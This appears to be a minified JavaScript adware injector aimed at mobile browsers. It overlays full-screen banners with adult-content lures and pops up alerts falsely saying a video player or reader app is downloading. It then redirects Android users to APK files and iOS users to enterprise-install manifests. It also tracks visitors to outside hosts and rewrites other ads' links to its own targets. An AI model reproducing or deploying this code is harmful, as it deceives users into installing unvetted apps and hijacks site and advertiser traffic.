var hy_itv=setInterval(function(){function a(a,b){var c=30,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()+";path=/"}function b(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?b[2]:null}function n(){var c=parseInt(b("hy_visit_time"));return isNaN(c)&&(c=0),c>=m&&(c=0),a("hy_visit_time",c+g),c}function w(){return/ipad|iphone|ipod/i.test(navigator.userAgent)?x():y()}function x(){var a;switch(d){case"16":a="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";break;default:a=.1>t?"http://tg.xyzs.com/dt/iphone.php?ref=cpa24":"itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist"}return a}function y(){var a;switch(d){case"31":a="http://t.cn/R7TPUOV";break;default:a=.4>t?"http://t.cn/R7n2ueA":.8>t?"http://soft.91zan.com/suwei/sybb.10C352.apk":"http://t.cn/R7TPUOV"}return a}function z(a){return"top"==a?e+j[p]:"bottom"==a?e+j[o]:void 0}function A(a){return"top"==a?e+"wb_t2.gif":"bottom"==a?e+"wb_ios2.gif":void 0}function B(){if(8==r)return!0;var a=Math.random();return a>.15?!0:!1}function C(){var c=new Date,d=60;if(!b("hycookietime"))return a("hycookietime",c.getTime()),!0;var e=c.getTime(),f=parseInt(b("hycookietime"));return e-f>1e3*60*d?(a("hycookietime",e),!0):!1}function X(a,b){setTimeout(function(){c("http://click.shuiguo.com/index.php?action=index&method=main1","t=undefined&l="+a+"&s="+b+"&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+U,function(){})},0)}if(document&&document.body){clearInterval(hy_itv);var c=function(a,b,c,d){var e=document.createElement("script"),f=document.getElementsByTagName("head")[0],g=null;e.type="text/javascript",e.language="javascript",d&&(this[d]=c),this.jsonpcallback=c;var b=b?"&"+b:"",h=/\?{1}/.test(a),i=h?a.slice(0,a.search(/\?{1}/)):a,j=h?a.slice(a.search(/\?{1}/)+1)+b:b;return e.src=i+"?"+j,f.appendChild(e),e.onload=e.onreadystatechange=function(){this.readyState&&"loaded"!==this.readyState&&"complete"!==this.readyState||(c(null,g),this.onload=this.onreadystatechange=null,this.parentNode.removeChild(this))},g},d=hy_cpc_num||"10",e="http://m.haoghost.com/images/",f="http://d.haoghost.com/",g=2,h=w(),i=x(),j=["wb_b2.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","wb_b5.gif","wb_b.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/note.html?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,f+"360xpg.apk",f+"360ysdq.apk"],l=["","","","","\u6b63\u5728\u4e0b\u8f7d\u5feb\u64ad\u9b45\u5f71,\u6fc0\u60c5\u65e0\u7801\u89c6\u5c4f\u968f\u610f\u770b","\u6b63\u5728\u4e0b\u8f7d\u5348\u591c\u89c6\u9891,\u79c1\u5bc6\u73cd\u85cf\u5927\u7247\u4efb\u4f60\u770b"];16==d&&(j=["wb_b3.gif","wb_n1.gif","wb_b5.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/note.html?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,f+"360xpg.apk",f+"360ysdq.apk"],l=["","","","","\u6b63\u5728\u4e0b\u8f7d\u5feb\u64ad\u9b45\u5f71,\u6fc0\u60c5\u65e0\u7801\u89c6\u5c4f\u968f\u610f\u770b","\u6b63\u5728\u4e0b\u8f7d\u5348\u591c\u89c6\u9891,\u79c1\u5bc6\u73cd\u85cf\u5927\u7247\u4efb\u4f60\u770b"]),31==d&&(j=["wb_b3.gif","wb_b5.gif","wb_b2.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d],l=["","",""]);var m=j.length;(24==d||25==d||26==d||29==d||31==d||72==d)&&(g=1);var o=n(),p=o==m-1?0:o+1;"1"==b("hycpc1")&&(h="http://t.cn/R7n2ueA",i="http://www.haima.me/?c=cpapz",a("hycpc1","0"));var q=new Date,r=q.getHours(),t=(q.getMinutes(),Math.random());if(/android/i.test(navigator.userAgent)||/ipad|iphone|ipod/i.test(navigator.userAgent)){var D="tag_"+d+"1",E="tag_"+d+"2",G=(k[o],"http://m.haoghost.com/ios.html?f=cpctag_"+d),H=k[0],I='<a href="'+k[p]+'" id="hy_'+D+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+z("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>',J='<a href="'+k[o]+'" id="hy_'+E+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+z("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';/ipad|iphone|mac|ios/i.test(navigator.userAgent)&&(H=G,D="tag_"+d+"3",E="tag_"+d+"4",I='<a href="'+G+'" id="hy_'+D+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+A("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>',J='<a href="'+G+'" id="hy_'+E+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+A("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>');var K='<div id="hy_cpc_top" style="text-align: center;display: block;width: 100%;filter: alpha(opacity=90);-moz-opacity: 0.9;-khtml-opacity: 0.9;opacity: 1;position: fixed;top: 0px;left: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;">'+I+'</div><div id="hy_cpc_bottom" style="text-align: center;display: block;width: 100%;opacity: 1;position: fixed;bottom: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;right: 0px;">'+J+'</div><div id="hy_cpc_tj" style="display:none"></div>',L=document.createElement("div");L.innerHTML=K,document.body.appendChild(L);var M=window.screen.width;M=M>400?360:M;var N=document.getElementById("hy_"+D),O=document.getElementById("hy_"+E),P=90*M/435,Q=document.getElementById("hy_cpc_top"),R=document.getElementById("hy_cpc_bottom"),S=document.getElementById("hy_cpc_imgt"),T=document.getElementById("hy_cpc_imgb");!function(){var a=document.createElement("script"),b=document.getElementById("hy_cpc_tj");a.type="text/javascript",a.language="javascript",a.src="http://s95.cnzz.com/stat.php?id=1253202217",b.appendChild(a)}(),24==d||25==d||26==d||29==d||31==d||71==d||72==d?N.style.display="none":document.body.style["padding-top"]=P+"px",M=M>1305?1305:M,document.body.style["padding-bottom"]=P+"px",document.getElementById("hy_cpc_tclose").addEventListener("touchstart",function(a){return Q.style.display="none",document.body.style["padding-top"]="0px",a.stopPropagation?a.stopPropagation():window.event&&(window.event.cancelBubble=!0),!1},!1),document.getElementById("hy_cpc_bclose").addEventListener("touchstart",function(a){return R.style.display="none",document.body.style["padding-bottom"]="0px",a.stopPropagation?a.stopPropagation():window.event&&(window.event.cancelBubble=!0),!1},!1);var U=navigator.userAgent;if(function(){function k(){window.setTimeout(function(){function c(c){var d=parseInt(b("hycookietime"));d-=1e3*60*c,a("hycookietime",d)}if(18==d||19==d||31==d||32==d||33==d||35==d||36==d){if(!C())return;e.indexOf("\u300b")<0?e="\u6b63\u5728\u4e3a\u60a8\u4e0b\u8f7d\u672c\u7ad9\u4e13\u7528\u624b\u673a\u64ad\u653e\u5668\uff0c\u5b89\u88c5\u540e\u5373\u53ef\u89c2\u770b\u672c\u7ad9\u6240\u6709\u7535\u5f71\u89c6\u9891":(e=e.split("\u300b")[0]+"\u300b",e="\u6b63\u5728\u4e3a\u60a8\u4e0b\u8f7d\u672c\u7ad9\u4e13\u7528\u624b\u673a\u64ad\u653e\u5668\uff0c\u5b89\u88c5\u540e\u5373\u53ef\u89c2\u770b"+e)}else if(15==d||28==d||29==d||34==d){if(!C())return;e="\u6b63\u5728\u4e0b\u8f7d\u795e\u5947\u5f71\u9662\uff0c\u6d77\u91cf\u89c6\u9891\u4efb\u4f60\u770b"}else{if(23!=d&&24!=d&&25!=d&&26!=d&&27!=d)return;if(!C())return;e="\u6b63\u5728\u4e0b\u8f7d\u4e13\u4e1a\u9605\u8bfb\u5668\uff0c\u5168\u56fd\u8d44\u6e90\u6700\u5168\u7684\u79bb\u7ebf\u5c0f\u8bf4APP\uff0c\u9996\u6b21\u5b89\u88c5\u90017\u65e5\u4f1a\u5458\u3002"}/ipad|iphone|mac|ios/i.test(navigator.userAgent)?(alert(e),window.location.href=i,a("hycpc1","1")):(alert(e),window.location.href=h.indexOf("http")>=0?h:"http://d.haoghost.com/"+h,a("hycpc1","1"),c(50))},1e3)}var e=document.getElementsByTagName("title")[0].innerHTML,f=parseInt(b("hyipdata"));if(0!=f&&1!=f&&/android/i.test(U)){if(B()){a("hyipdata","0"),h="Qvod_collect_v3.14.16.apk",c("http://click.shuiguo.com/index.php?action=index&method=main1","t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+U,function(){});var g=document.createElement("script");g.type="text/javascript",g.language="javascript",g.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";var j=document.getElementById("hy_cpc_tj");j.appendChild(g)}else a("hyipdata","1");k()}else k()}(),window.setInterval(function(){function a(a){var b=document.getElementById(a);b&&b.parentNode.removeChild(b)}function c(a){for(var e,c=document.getElementsByTagName("div"),d=0;e=c[d];d++){var f=e.getAttribute("id");f&&f.indexOf(a)>-1&&(e.parentNode.removeChild(e),b=1)}}var b=0;if(27==d&&a("lgVshow"),28==d){if(1==b)return;c("star8")}if(31==d&&c("BAIDU_DUP"),32==d&&(a("__70e_1"),a("__70e_2"),a("xcy_fmt"),O.style.display=""),33==d&&a("cs_right_bottom"),36==d&&a("JS_BottmEX2_Div"),22==d){a("__keyrun_RM_Div");var e,f=document.getElementById("viewxxx");f&&f.setAttribute("href",H),window.frames.baidu_clb_slot_iframe_984242_0.document&&(e=window.frames.baidu_clb_slot_iframe_984242_0.document.getElementsByTagName("a")[0]),window.frames.BAIDU_DUP_wrapper_984242_0.document&&(e=window.frames.BAIDU_DUP_wrapper_984242_0.document.getElementsByTagName("a")[0]),e&&e.setAttribute("href",H)}if(18==d||19==d){a("q1q2a3d4d5iva");var g=document.getElementById("JS_BottmEX2_Div"),h=document.getElementsByTagName("ins"),i=document.getElementsByTagName("a"),j=[];j[0]="http://cnrdn.com/fyRE",j[1]="http://xiazai.3ddianshiji.com/i/",j[2]="http://download.wuji.com:6677/wuji/setup/",j[3]="http://dl.client.baidu.com/union/",j[4]="http://pc.cyousoft.com/shouqu_126_10.html",j[5]="http://www.baidu.com/cb.php?",j[6]="http://www.z3330.com",j[7]="http://vs.cyousoft.com",g&&(g.style.display="none"),h[0]&&(h[0].style.display="none");for(var h=0;h<i.length;h++){var k=i[h].getAttribute("href");if(k)for(var l=0;l<j.length;l++)if(k.indexOf(j[l])>-1){i[h].setAttribute("href",H);break}}}},500),/ipad|iphone|mac|ios/i.test(navigator.userAgent))return;var V=document.createElement("script");V.type="text/javascript",V.language="javascript",V.src="http://v1.cnzz.com/stat.php?id=1253417451&web_id=1253417451";var W=document.getElementById("hy_cpc_tj");W.appendChild(V),""!=l[p]&&S.addEventListener("touchend",function(){X(N.getAttribute("href"),D),alert(l[p])}),""!=l[o]&&T.addEventListener("touchend",function(){X(O.getAttribute("href"),E),alert(l[o])})}}},500);